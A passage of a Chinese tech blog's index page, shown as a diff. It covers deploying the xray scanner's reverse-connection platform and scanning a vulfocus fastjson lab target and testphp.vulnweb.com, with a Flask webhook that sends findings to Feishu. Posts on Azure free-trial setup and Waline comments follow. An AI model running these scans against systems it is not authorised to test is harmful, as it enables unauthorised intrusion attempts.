class="string">&quot;your_vps_ip&quot;</span>                   <span class="comment"># 和 http_base_url 类似，实际用来访问 dns 服务器的地址</span></span><br></pre></td></tr></table></figure>
+
+<p>⚠️ 需要注意填写位置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">enabled: 设置为false就</span><br><span class="line">client: 因为是独立的远程server 所以 remote_server 的值需要为true</span><br><span class="line">http_base_url: 你的云服务器加端口号，端口号为listen_port</span><br><span class="line">dns_server_ip: 你的云服务器IP</span><br></pre></td></tr></table></figure>
+
+
+
+<p>至此，服务端和客户端的配置文件已改好。</p>
+<h2 id="测试部署效果"><a href="#测试部署效果" class="headerlink" title="测试部署效果"></a>测试部署效果</h2><p>在服务端启动以下命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray_linux_amd64 reverse</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311291711359.png" alt="启动xray resverse"></p>
+<p>访问webUI后的链接即可访问到反连平台，输入你的token值</p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311291712676.png" alt="登录反连平台"></p>
+<p>可以生成url或者域名</p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311291713654.png" alt="生成url或者域名都可"></p>
+<h3 id="fastjson漏洞测试"><a href="#fastjson漏洞测试" class="headerlink" title="fastjson漏洞测试"></a>fastjson漏洞测试</h3><p>靶场：vulfocus的fastjson 代码执行 （CNVD-2019-22238)</p>
+<ol>
+<li><p>启动远程服务端</p>
+</li>
+<li><p>使用客户端对目标进行扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray_linux_amd64 ws --plug fastjson --url http://123.58.224.8:32636/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311291718568.png" alt="测试结果"></p>
+</li>
+</ol>
+<h2 id="对接飞书实现自动告警"><a href="#对接飞书实现自动告警" class="headerlink" title="对接飞书实现自动告警"></a>对接飞书实现自动告警</h2><p>这点官方文档上面写的是对接Server 酱 和 企业微信，博主喜欢用飞书，于是就在官方的demo上修修改改，对接了飞书自动告警</p>
+<p>效果如下：</p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311301719658.png" alt="飞书机器人"></p>
+<p>参照官方文档的demo如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push_feishu_group</span>(<span class="params">content</span>):</span><br><span class="line">    resp = requests.post(</span><br><span class="line">        <span class="string">&quot;https://open.feishu.cn/open-apis/bot/v2/hook/&#123;飞书机器人webhook的token&#125;&quot;</span>,</span><br><span class="line">        json=&#123;</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Charset&quot;</span>: <span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;msg_type&quot;</span>: <span class="string">&quot;text&quot;</span>,</span><br><span class="line">            <span class="string">&quot;content&quot;</span>: &#123;<span class="string">&quot;text&quot;</span>: <span class="string">f&quot;xray 发现了新漏洞 \n<span class="subst">&#123;content&#125;</span>&quot;</span>&#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> resp.json()[<span class="string">&quot;errno&quot;</span>] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;push wechat group failed, %s&quot;</span> % resp.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/webhook&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xray_webhook</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    typed = data[<span class="string">&quot;type&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> typed == <span class="string">&quot;web_statistic&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span></span><br><span class="line">    vuln = data[<span class="string">&quot;data&quot;</span>]</span><br><span class="line">    content = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">url: &#123;url&#125;</span></span><br><span class="line"><span class="string">plugin: &#123;plugin&#125;</span></span><br><span class="line"><span class="string">create_time: &#123;create_time&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        url=vuln[<span class="string">&quot;detail&quot;</span>][<span class="string">&quot;addr&quot;</span>],</span><br><span class="line">        plugin=vuln[<span class="string">&quot;plugin&quot;</span>],</span><br><span class="line">        create_time=<span class="built_in">str</span>(datetime.datetime.fromtimestamp(vuln[<span class="string">&quot;create_time&quot;</span>] / <span class="number">1000</span>)),</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        push_feishu_group(content)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        logging.exception(e)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>服务器启动一个screen</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -S feishu</span><br></pre></td></tr></table></figure>
+
+<p>python 运行脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 feishu.pyt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311301725831.png" alt="运行脚本"></p>
+<p>运行xray即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray_linux_amd64 ws -u http://testphp.vulnweb.com  --wo http://127.0.0.1:5000/webhook</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311301729767.png" alt="漏洞结果"></p>
+<p>脚本也能看到请求</p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311301729691.png" alt="脚本接收到的请求"></p>
+<h2 id="参考来源"><a href="#参考来源" class="headerlink" title="参考来源"></a>参考来源</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://docs.xray.cool/#/scenario/reverse">如何部署xray反连平台 - xray 安全评估工具文档</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1ED4y1v7NK/?vd_source=1ce79553d9a3c0c79cf53797a5c70476">xray三周年系列教程｜如何部署反连平台并编写POC_哔哩哔哩_bilibili</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38963246/article/details/116712362">Xray-反连平台搭建_xray反连平台-CSDN博客</a></li>
+<li><a target="_blank" rel="noopener" href="https://open.feishu.cn/document/client-docs/bot-v3/add-custom-bot">自定义机器人使用指南 - 开发指南 - 开发文档 - 飞书开放平台 (feishu.cn)</a></li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://suiyideali.github.io/2023/11/26/%E7%99%BD%E5%AB%96Azure%E8%B4%A6%E6%88%B7200%E7%BE%8E%E5%85%83-12%E6%9C%88%E5%85%8D%E8%B4%B9%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0ch4z">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Geek小黑板">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/11/26/%E7%99%BD%E5%AB%96Azure%E8%B4%A6%E6%88%B7200%E7%BE%8E%E5%85%83-12%E6%9C%88%E5%85%8D%E8%B4%B9%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/" class="post-title-link" itemprop="url">白嫖Azure账户200美元+12月免费云服务器</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-11-26 16:37:30" itemprop="dateCreated datePublished" datetime="2023-11-26T16:37:30+08:00">2023-11-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-11-27 15:17:38" itemprop="dateModified" datetime="2023-11-27T15:17:38+08:00">2023-11-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/" itemprop="url" rel="index"><span itemprop="name">云服务器</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>💡 想享受Azure免费12个月试用的限制：</p>
+<ul>
+<li>需要试用完200美元或者过了30天后，<strong>必须升级即用即付后</strong>，才能享受12个月免费服务。</li>
+<li>免费12个月期间，如果产生扣费（比如流量超了）会在下个月账单中直接信用卡扣费。（需要关注自己的流量使用情况）</li>
+<li>免费12个月到期后，订阅不会自带停止，如果不主动关闭已开通的免费资源会直接产生扣费。</li>
+</ul>
+<h2 id="活动地址"><a href="#活动地址" class="headerlink" title="活动地址"></a>活动地址</h2><p><a target="_blank" rel="noopener" href="https://azure.microsoft.com/zh-cn/free/">https://azure.microsoft.com/zh-cn/free/</a></p>
+<h2 id="活动内容"><a href="#活动内容" class="headerlink" title="活动内容"></a>活动内容</h2><ul>
+<li>赠送200＄</li>
+<li>免费12个月的服务：Linux 虚拟机，Windows 虚拟机，托管磁盘（虚机使用），文件存储，SQL 数据库，带宽（15G数据传输）</li>
+<li>永久免费：应用服务，函数，Azure Kubernetes 等等</li>
+</ul>
+<h2 id="注册账号前的准备工作"><a href="#注册账号前的准备工作" class="headerlink" title="注册账号前的准备工作"></a>注册账号前的准备工作</h2><ul>
+<li>一个微软账号</li>
+<li>一张信用卡（需要visa或万事达卡等外币卡），验证卡的时候扣费1美刀！</li>
+<li>一个手机号，国内手机号即可</li>
+</ul>
+<h2 id="注册步骤"><a href="#注册步骤" class="headerlink" title="注册步骤"></a>注册步骤</h2><ol>
+<li><p>填写注册信息</p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311261647390.png" alt="填写注册信息"></p>
+</li>
+<li><p>信用卡验证</p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311271511186.png" alt="信用卡验证"></p>
+</li>
+<li><p>注册成功后，网页会自动跳转到Azure 门户，同时也会发送邮件给你账户</p>
+</li>
+</ol>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311261658477.png" alt="注册成功邮件"></p>
+<h2 id="创建虚拟机"><a href="#创建虚拟机" class="headerlink" title="创建虚拟机"></a>创建虚拟机</h2><p>可直接访问创建虚拟机：<a target="_blank" rel="noopener" href="https://portal.azure.com/#blade/Microsoft_Azure_Billing/FreeServicesBlade">https://portal.azure.com/#blade/Microsoft_Azure_Billing/FreeServicesBlade</a><br>位置可选东南亚、美国东部、美国西部2、美国中部、西欧五个数据中心，我选的离我近的东南亚</p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311261714265.png" alt="免费服务"></p>
+<ol>
+<li><p>点击创建虚拟机，填写相关名称等</p>
+<p><strong>💡特别注意：区域推荐选择亚太地区！物理距离你越近，延迟越低！可选B1s 和 B2s，网上有人说选B1s，其他的要收费，但我看B2s好像也是免费，但是费用比B1s低，我这里选的B1s</strong></p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311261724047.png" alt="选择地区"></p>
+<p>我选择的是韩国地区</p>
+<p>身份验证类型：选择密码，填写用户名和密码。</p>
+<p>使用 Azure CLI 的 SSH 连接到服务器后直接使用 sudo -i 切换到 root</p>
+<p>可以直接点击【查看+创建】</p>
+<p>然后部署完毕</p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311261730634.png" alt="部署完成"></p>
+</li>
+<li><p>点击【转到资源】进行详细配置</p>
+<p>确认下配置磁盘是否为64G，据说磁盘为30G的话是要收费的。</p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311261743629.png" alt="确认磁盘配置"></p>
+</li>
+<li><p>开放端口</p>
+<p>点击【虚拟机】-【网络】</p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311261749628.png" alt="网络"></p>
+<p>添加入站端口规则</p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311261750862.png" alt="添加入站规则"></p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311261751117.png" alt="开放所有端口"></p>
+</li>
+<li><p>使用 Azure CLI 的 SSH 连接到服务器，然后绑定到牧云主机管理助手上</p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311261815570.png" alt="绑定到牧云主机管理助手"></p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311261824771.png" alt="服务器配置"></p>
+</li>
+</ol>
+<h2 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><p>Q：开始使用 Azure 免费帐户时需要付费吗？</p>
+<p>A：开始时免费，并且还将获得 $200 信用额度，用户可在前 30 天使用这些信用额度。</p>
+<p> <img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311261756161.png" alt="额度"></p>
+<p>Q：$200 的免费信用额度用完或 30 天到期后会发生什么情况？</p>
+<p>A：Azure将发送通知，以便用户能够决定是否升级为即用即付定价并移除支出限制。如果决定升级，便可继续访问所有免费产品。如果决定不升级，将禁用你的帐户和产品，你需要升级才可继续使用。</p>
+<p>Q：免费产品 12 个月的使用期结束时，将发生什么情况？</p>
+<p>A：自升级帐户起的 12 个月内可免费使用某些常用产品的部分功能（如计算、网络、存储和数据库）。12 个月之后，这些产品仍继续正常运行，但它们将按标准即用即付费率收费。(不使用的时候记得主动注销)</p>
+<h2 id="意外之喜"><a href="#意外之喜" class="headerlink" title="意外之喜"></a>意外之喜</h2><p>和Google Cloud Platform&#x2F;API 信任与安全团队 拉扯了一天，我的GCP服务器也成功申诉回来了！</p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311261842378.png" alt="GCP服务器回归"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://suiyideali.github.io/2023/11/11/Fluid%E4%BD%BF%E7%94%A8Waline%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0ch4z">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Geek小黑板">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/11/11/Fluid%E4%BD%BF%E7%94%A8Waline%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/" class="post-title-link" itemprop="url">Fluid使用Waline评论系统</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-11-11 13:41:54 / 修改时间：15:41:48" itemprop="dateCreated datePublished" datetime="2023-11-11T13:41:54+08:00">2023-11-11</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="1-简介"><a href="#1-简介" class="headerlink" title="1.  简介"></a>1.  简介</h1><p>Waline 是一款基于 Valine 衍生的简洁、安全的评论系统。</p>
+<p>官网链接：<a href="https://link.juejin.cn/?target=https://waline.js.org/">waline.js.org&#x2F;</a></p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311111347328.png" alt="image-20231111134736259"></p>
+<p>我这里是直接部署到Vercel上</p>
+<p>实现效果：</p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311111440683.png" alt="实现效果"></p>
+<h1 id="2-部署步骤"><a href="#2-部署步骤" class="headerlink" title="2. 部署步骤"></a>2. 部署步骤</h1><h2 id="2-1-LeanCloud-设置-数据库"><a href="#2-1-LeanCloud-设置-数据库" class="headerlink" title="2.1  LeanCloud 设置 (数据库)"></a>2.1  LeanCloud 设置 (数据库)</h2><ol>
+<li><p><a target="_blank" rel="noopener" href="https://console.leancloud.app/login">登录</a> 或 <a target="_blank" rel="noopener" href="https://console.leancloud.app/register">注册</a> <code>LeanCloud 国际版</code> 并进入 <a target="_blank" rel="noopener" href="https://console.leancloud.app/apps">控制台</a></p>
+</li>
+<li><p>点击左上角 <a target="_blank" rel="noopener" href="https://console.leancloud.app/apps">创建应用</a> 并起一个你喜欢的名字 (请选择免费的开发版):</p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311111349627.png" alt="在LeanCloud创建应用"></p>
+</li>
+<li><p>进入应用，选择左下角的 <code>设置</code> &gt; <code>应用 Key</code>。你可以看到你的 <code>APP ID</code>,<code>APP Key</code> 和 <code>Master Key</code>。请记录它们，以便后续使用。</p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311111351977.png" alt="记录应用凭证"></p>
+</li>
+</ol>
+<h2 id="2-2-Vercel-部署-服务端"><a href="#2-2-Vercel-部署-服务端" class="headerlink" title="2.2  Vercel 部署 (服务端)"></a>2.2  Vercel 部署 (服务端)</h2><ol>
+<li>Vercel：<a target="_blank" rel="noopener" href="https://wsc.fit/04">wsc.fit&#x2F;04</a> （为方便阅读，已设置成短链接，可放心访问）</li>
+</ol>
+<p>⚠️ 如果你未登录的话，Vercel 会让你注册或登录，请使用 GitHub 账户进行快捷登录。</p>
+<ol start="2">
+<li><p>输入一个你喜欢的 Vercel 项目名称并点击 <code>Create</code> 继续</p>
+</li>
+<li><p>等待自动为你创建项目，出现以下页面表示已经成功创建Vercel 项目，点击<code>Go to Dashboard</code> 可以跳转到应用的控制台。</p>
+</li>
+</ol>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311111358961.png" alt=" Vercel 项目创建成功"></p>
+<ol start="4">
+<li>点击顶部的 <code>Settings</code> - <code>Environment Variables</code> 进入环境变量配置页，并配置三个环境变量 <code>LEAN_ID</code>, <code>LEAN_KEY</code> 和 <code>LEAN_MASTER_KEY</code> 。它们的值分别对应上一步在 LeanCloud 中获得的 <code>APP ID</code>, <code>APP KEY</code>, <code>Master Key</code>。</li>
+</ol>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311111402966.png" alt="配置环境变量"></p>
+<p>​	成功配置好环境变量</p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311111405033.png" alt="配置环境变量"></p>
+<ol start="5">
+<li>环境变量配置完成之后点击顶部的 <code>Deployments</code> 点击顶部最新的一次部署右侧的 <code>Redeploy</code> 按钮进行重新部署。该步骤是为了让刚才设置的环境变量生效。</li>
+</ol>
+<p>​	<img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311111408010.png" alt="Redeploy"></p>
+<ol start="6">
+<li><p>此时会跳转到 <code>Overview</code> 界面开始部署，等待片刻后 <code>STATUS</code> 会变成 <code>Ready</code>。此时请点击 <code>Visit</code> ，即可跳转到部署好的网站地址，此地址即为你的服务端地址。</p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311111410602.png" alt="Ready"></p>
+</li>
+<li><p>在配置文件里面填入 serverURL</p>
+<p><img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311111441386.png" alt="填入serverURL"></p>
+</li>
+</ol>
+<p>​	serverURL在 vercel 项目的Settings -&gt; Domains 处</p>
+<p>​	<img src="https://ob-typora.oss-cn-shanghai.aliyuncs.com/images/202311111443904.png" alt="serverURL"></p>
+<p>至此，Waline评论系统已成功部署。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
 
-              </div>
-            </div>
           </div>
-        </div>
-      </div>
-    
+          
 
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-
-    
-
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
-    </div>
-  
-  
-    <div class="statistics">
-  
-  
-
-  
-    
-      <span id="leancloud-site-pv-container" style="display: none">
-        总访问量 
-        <span id="leancloud-site-pv"></span>
-         次
-      </span>
-    
-    
-      <span id="leancloud-site-uv-container" style="display: none">
-        总访客数 
-        <span id="leancloud-site-uv"></span>
-         人
-      </span>
-    
-    
-
-  
-</div>
-
-  
-  
-  
-</div>
-
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
       }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">m0ch4z</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">m0ch4z</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-
-  <script defer src="/js/leancloud.js" ></script>
-
